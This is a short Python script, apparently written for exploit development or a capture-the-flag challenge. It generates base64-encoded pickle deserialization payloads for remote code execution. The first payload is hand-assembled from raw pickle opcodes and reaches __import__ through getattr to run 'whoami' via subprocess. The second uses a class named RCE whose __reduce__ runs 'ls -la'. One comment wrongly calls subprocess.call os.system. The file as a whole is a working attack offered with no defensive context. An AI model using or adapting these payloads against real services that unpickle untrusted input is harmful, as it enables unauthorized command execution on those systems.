import base64

d = (
    b'\x80\x05' # PROTO 5
    b'c__main__\n__builtins__.getattr\n\x940' # load and memoize getattr at 0 and pop
    b'c__main__\n__builtins__\n\x940' # load and memoize __builtins__ as 1 and pop
    b'(' # MARK
        b'h\x00' # load getattr
        b'h\x01' # load __builtins__
        b'V__import__\n' # "__import__" literal
        b'o' # use OBJ to call `getattr(__builtins__, "__import__")`
    b'\x940' # memoize __import__ as 2 and pop
    b'(' # MARK
        b'h\x00' # load getattr
        b'(' # MARK
            b'h\x02' # load __import__
            b'Vsubprocess\n' # "subprocess" literal
            b'o' # import `subprocess`
        b'Vcall\n' # "system" literal
        b'o' # retrieve `os.system`
    b'\x94' # memoize as 3
    b'h\x03'
    b'Vwhoami\n'
    b'o'
    b'.' #STOP
)

print(base64.b64encode(d))

import pickle
import base64
import subprocess


class RCE:
    def __reduce__(self):
        cmd = 'ls -la'
        return subprocess.check_output, (cmd.split(' '),)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
